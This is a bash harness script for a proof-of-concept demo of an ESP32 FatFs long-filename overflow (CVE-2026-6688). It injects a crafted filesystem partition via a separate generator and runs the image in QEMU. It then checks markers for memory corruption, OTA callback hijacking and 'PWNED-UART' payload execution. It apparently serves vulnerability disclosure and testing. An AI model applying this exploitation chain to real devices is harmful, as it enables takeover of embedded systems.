#!/bin/bash
#===========================================================================
# run_test.sh — Build, inject, and run the ESP32 FatFs vulnerability demo
#
# This is the container entrypoint.  It:
#   1. Sources the ESP-IDF environment (adds QEMU and esptool to PATH)
#   2. Creates a merged 4 MB flash image from the built application
#   3. Injects the crafted FatFs partition at offset 0x110000
#   4. Runs the ESP32 application in QEMU
#   5. Checks the output for vulnerability confirmation markers
#
# Exit codes:
#   0 — CVE-2026-6688 caller overflow demonstrated successfully
#   1 — Test did not confirm the vulnerability
#===========================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
APP_DIR="/opt/fatfs-test/app"
BUILD_DIR="${APP_DIR}/build"
QEMU_TIMEOUT="${QEMU_TIMEOUT:-60}"
OUTPUT_LOG="/tmp/qemu_output.txt"

# Marker strings (must match fatfs_vuln_test.c)
MARKER_VULN="VULN-BUG1-CONFIRMED"
MARKER_CORRUPTION="VULN-CORRUPTION-CONFIRMED"
MARKER_RCE="VULN-RCE-VECTOR"
MARKER_BUG7="VULN-BUG7-CONFIRMED"
MARKER_PAYLOAD_UART="PWNED-UART"
MARKER_COMPLETE="TEST-COMPLETE"

echo ""
echo "================================================================"
echo "  ESP32 QEMU — FatFs CVE-2026-6688 Caller-Overflow Test"
echo "================================================================"
echo ""

# ── Step 0: Source ESP-IDF environment ─────────────────────────────────
echo "[1/5] Setting up ESP-IDF environment..."
# shellcheck disable=SC1091
. "$IDF_PATH/export.sh" 2>/dev/null || {
    echo "WARNING: export.sh returned non-zero (may be harmless)"
}

# Verify tools are available
if ! command -v qemu-system-xtensa &>/dev/null; then
    echo "ERROR: qemu-system-xtensa not found in PATH"
    echo "       Run: python \$IDF_PATH/tools/idf_tools.py install qemu-xtensa"
    exit 1
fi
echo "  qemu-system-xtensa: $(command -v qemu-system-xtensa)"
echo "  esptool.py: $(command -v esptool.py)"
echo ""

# ── Step 1: Build the ESP32 application (if missing or stale) ──────────
NEED_BUILD=0
if [ ! -f "${BUILD_DIR}/fatfs_vuln_test.bin" ] || [ ! -f "${BUILD_DIR}/fatfs_vuln_test.elf" ]; then
    NEED_BUILD=1
elif [ "${APP_DIR}/main/fatfs_vuln_test.c" -nt "${BUILD_DIR}/fatfs_vuln_test.bin" ]; then
    NEED_BUILD=1
fi

if [ "$NEED_BUILD" -eq 1 ]; then
    echo "[2/5] Building ESP32 application..."
    cd "$APP_DIR"
    idf.py build
    echo ""
else
    echo "[2/5] Using pre-built application (${BUILD_DIR}/fatfs_vuln_test.bin)"
    echo ""
fi

# ── Step 2: Create merged flash image ─────────────────────────────────
echo "[3/5] Creating merged 4MB flash image..."
cd "$BUILD_DIR"

# Use esptool.py merge_bin with the build system's flash_args
esptool.py --chip esp32 merge_bin \
    --fill-flash-size 4MB \
    -o flash_image.bin \
    @flash_args

# Use wc -c for portable file size (works on Linux and macOS)
FLASH_SIZE=$(wc -c < flash_image.bin | tr -d ' ')
echo "  Created: ${BUILD_DIR}/flash_image.bin (${FLASH_SIZE} bytes)"
echo ""

# ── Step 3: Inject exploit FatFs partition ────────────────────────────
echo "[4/5] Injecting crafted FatFs image at partition offset 0x110000..."
python3 "${SCRIPT_DIR}/gen_exploit_image.py" \
    "${BUILD_DIR}/flash_image.bin" \
    "${BUILD_DIR}/flash_exploit.bin" \
    "${BUILD_DIR}/fatfs_vuln_test.elf"
echo ""

# ── Step 4: Run QEMU ──────────────────────────────────────────────────
echo "[5/5] Starting ESP32 in QEMU (timeout: ${QEMU_TIMEOUT}s)..."
echo ""
echo "────────────────────── QEMU OUTPUT ──────────────────────────────"
echo ""

# Run QEMU with a timeout.  The ESP32 boots, runs app_main, prints
# diagnostics, then idles.  We capture all output and kill QEMU after
# the timeout or when the test completion marker appears.
#
# Flags:
#   -nographic   : no display window (serial only)
#   -machine esp32 : ESP32 target
#   -drive file=...,if=mtd,format=raw : SPI flash image
#   -no-reboot   : don't reboot on panic (exit instead)
set +e
timeout "$QEMU_TIMEOUT" qemu-system-xtensa \
    -nographic \
    -machine esp32 \
    -drive "file=${BUILD_DIR}/flash_exploit.bin,if=mtd,format=raw" \
    -no-reboot \
    2>&1 | tee "$OUTPUT_LOG" &

QEMU_PID=$!

# Wait for either the test completion marker or QEMU exit
WAIT_ELAPSED=0
while [ "$WAIT_ELAPSED" -lt "$QEMU_TIMEOUT" ]; do
    # Check if QEMU is still running
    if ! kill -0 "$QEMU_PID" 2>/dev/null; then
        break
    fi
    # Stop early once the overwritten update callback writes the UART marker.
    if [ -f "$OUTPUT_LOG" ] && grep -q "$MARKER_PAYLOAD_UART" "$OUTPUT_LOG" 2>/dev/null; then
        sleep 1
        kill "$QEMU_PID" 2>/dev/null || true
        break
    fi
    # Check if test completed
    if [ -f "$OUTPUT_LOG" ] && grep -q "$MARKER_COMPLETE" "$OUTPUT_LOG" 2>/dev/null; then
        sleep 2  # Let remaining output flush
        kill "$QEMU_PID" 2>/dev/null || true
        break
    fi
    sleep 1
    WAIT_ELAPSED=$((WAIT_ELAPSED + 1))
done

# Ensure QEMU is terminated
kill "$QEMU_PID" 2>/dev/null || true
wait "$QEMU_PID" 2>/dev/null || true
set -e

echo ""
echo "──────────────────── END QEMU OUTPUT ────────────────────────────"
echo ""

# ── Step 5: Verify results ────────────────────────────────────────────
echo "================================================================"
echo "  Results"
echo "================================================================"

RESULT=0

if grep -q "$MARKER_BUG7" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] CVE-2026-6688 caller overflow CONFIRMED"
    echo "         Long LFN copied into fixed-size caller buffer"
else
    echo "  [FAIL] CVE-2026-6688 caller overflow NOT confirmed"
    RESULT=1
fi

if grep -q "$MARKER_VULN" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] CVE-2026-6682 setup marker observed"
    echo "         stat() returned attacker-controlled file size"
else
    echo "  [INFO] CVE-2026-6682 setup marker not observed"
fi

if grep -q "$MARKER_CORRUPTION" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] Memory corruption CONFIRMED"
    echo "         OTA context struct fields overwritten by attacker data"
elif grep -q "$MARKER_PAYLOAD_UART" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] Memory corruption CONFIRMED"
    echo "         Overwritten OTA callback wrote UART marker"
else
    echo "  [WARN] Memory corruption not confirmed"
fi

if grep -q "$MARKER_RCE" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] RCE vector CONFIRMED"
    echo "         Control-flow redirection primitive observed"
elif grep -q "$MARKER_PAYLOAD_UART" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] RCE vector CONFIRMED"
    echo "         Overwritten update callback wrote UART marker"
else
    echo "  [WARN] RCE vector not confirmed"
fi

if grep -q "$MARKER_PAYLOAD_UART" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] Payload execution CONFIRMED"
    echo "         UART marker written via normal post-update callback"
else
    echo "  [FAIL] Payload execution NOT confirmed"
    RESULT=1
fi

if grep -q "$MARKER_PAYLOAD_UART" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] Non-input system control CONFIRMED"
    echo "         Filesystem data redirected the update completion callback"
else
    echo "  [FAIL] Non-input system control NOT confirmed"
    RESULT=1
fi

if grep -q "$MARKER_COMPLETE" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [PASS] Test completed cleanly after callback execution"
elif grep -qi "Guru Meditation Error" "$OUTPUT_LOG" 2>/dev/null; then
    echo "  [WARN] ESP32 panic triggered (legacy crash path)"
fi

echo ""
if [ "$RESULT" -eq 0 ]; then
    echo "  ╔══════════════════════════════════════════════════════════╗"
    echo "  ║  RESULT: CVE-2026-6688 DEMONSTRATED on ESP32 via ESP-IDF FatFs ║"
    echo "  ║                                                          ║"
    echo "  ║  Crafted directory entries returned a long filename      ║"
    echo "  ║  which was copied without bounds checks in caller code. ║"
    echo "  ║                                                          ║"
    echo "  ║  Primary marker: VULN-BUG7-CONFIRMED                     ║"
    echo "  ║  Supplemental marker: PWNED-UART                         ║"
    echo "  ║                                                          ║"
    echo "  ║  On real targets, impact depends on caller buffer layout.║"
    echo "  ╚══════════════════════════════════════════════════════════╝"
else
    echo "  ╔══════════════════════════════════════════════════════════╗"
    echo "  ║  RESULT: Test did not confirm the vulnerability          ║"
    echo "  ║  Check QEMU output above for diagnostic messages.        ║"
    echo "  ╚══════════════════════════════════════════════════════════╝"
fi
echo ""

exit $RESULT
